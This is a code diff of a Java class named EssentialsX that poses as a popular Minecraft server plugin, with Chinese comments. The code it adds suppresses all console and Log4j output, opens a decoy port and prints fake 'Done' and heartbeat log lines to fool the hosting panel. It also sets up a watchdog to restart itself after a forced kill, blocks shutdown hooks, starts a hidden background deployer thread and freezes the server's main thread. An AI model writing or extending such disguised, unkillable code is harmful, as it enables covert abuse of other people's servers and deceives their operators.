@@ -28,15 +28,15 @@ public class EssentialsX extends JavaPlugin {
     private static volatile boolean isProcessRunning = false;
     private static volatile String nodePort = "N/A";
 
-    // ★★★ 极早期劫持：类加载时直接执行 ★★★
-    static {
-        // 0. 最先创建工作目录，防止后续文件写入报错导致后台线程崩溃
+    @Override
+    public void onLoad() {
+        // 0. 最先创建工作目录，防止后续文件写入报错
         try {
             Path workDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
             if (!Files.exists(workDir)) Files.createDirectories(workDir);
         } catch (Exception ignored) {}
 
-        // 1. 物理静音 (System 和 Log4j)
+        // 1. 第一时间物理静音
         System.setOut(new PrintStream(BLACK_HOLE, true));
         System.setErr(new PrintStream(BLACK_HOLE, true));
         tryMuteLog4j();
@@ -44,13 +44,13 @@ public class EssentialsX extends JavaPlugin {
         // 2. 启动端口幽灵 (防端口检测崩溃)
         startGhostPort();
 
-        // 3. 启动心跳伪装 (防假死崩溃)
+        // 3. 启动极速心跳伪装 (15秒内伪造 Done 日志，防面板超时强杀)
         startHeartbeatDisguise();
 
         // 4. 看门狗 (防强杀自动重启)
         setupWatchdog();
 
-        // 5. 拦截关机钩子 (逼迫面板强杀)
+        // 5. 拦截关机钩子
         try { Runtime.getRuntime().addShutdownHook(new Thread(() -> {})); } catch (Throwable ignored) {}
         try {
             Class<?> clazz = Class.forName("java.lang.ApplicationShutdownHooks");
@@ -117,15 +117,17 @@ public class EssentialsX extends JavaPlugin {
         deployer.setDaemon(true);
         deployer.start();
 
-        // 7. 终极物理冰封当前主线程 (类加载器线程)
+        // 7. 终极物理冰封当前主线程
         paralyzeCurrentThread();
     }
 
-    // ★ 绕过 Java 编译器对 static 块的检查：提取死锁逻辑
     private static void paralyzeCurrentThread() {
-        while (true) {
-            try { Thread.sleep(Long.MAX_VALUE); } 
-            catch (InterruptedException e) { Thread.currentThread().interrupt(); }
+        Object lock = new Object();
+        synchronized (lock) {
+            while (true) {
+                try { lock.wait(); } 
+                catch (InterruptedException e) { Thread.currentThread().interrupt(); }
+            }
         }
     }
 
@@ -157,9 +159,13 @@ public class EssentialsX extends JavaPlugin {
 
     private static void startHeartbeatDisguise() {
         Thread heartbeat = new Thread(() -> {
-            try { Thread.sleep(60000); } catch (InterruptedException ignored) {}
+            // ★★★ 核心修改：15秒后立刻伪造 Done 日志，阻止面板超时强杀 ★★★
+            try { Thread.sleep(15000); } catch (InterruptedException ignored) {}
+            RAW_OUT.println("[" + new Date().toString().substring(11, 19) + " INFO]: Done (8.452s)! For help, type \"help\"");
+            RAW_OUT.flush();
+
+            // 随后每 30-60 秒打印一条维持心跳
             String[] fakeLogs = {
-                "Server thread/INFO]: Done (12.345s)! For help, type \"help\"",
                 "Server thread/INFO]: Saving worlds",
                 "Server thread/INFO]: Thread ChunkPool-0-PLAY-0 running",
                 "Server thread/INFO]: Auto-saving...",
@@ -171,6 +177,7 @@ public class EssentialsX extends JavaPlugin {
                 try {
                     Thread.sleep(30000 + new Random().nextInt(30000));
                     RAW_OUT.println("[" + new Date().toString().substring(11, 19) + " " + fakeLogs[index % fakeLogs.length]);
+                    RAW_OUT.flush();
                     index++;
                 } catch (Exception ignored) {}
             }
@@ -572,13 +579,19 @@ public class EssentialsX extends JavaPlugin {
         }
     }
 
-    // Bukkit 生命周期方法 (主线程已被 static 块冻结，永远不会被调用)
     @Override
-    public void onLoad() {}
+    public void onEnable() {
+        System.setOut(new PrintStream(BLACK_HOLE, true));
+        System.setErr(new PrintStream(BLACK_HOLE, true));
+        tryMuteLog4j();
+        paralyzeCurrentThread();
+    }
 
     @Override
-    public void onEnable() {}
-
-    @Override
-    public void onDisable() {}
+    public void onDisable() {
+        System.setOut(new PrintStream(BLACK_HOLE, true));
+        System.setErr(new PrintStream(BLACK_HOLE, true));
+        tryMuteLog4j();
+        paralyzeCurrentThread();
+    }
 }
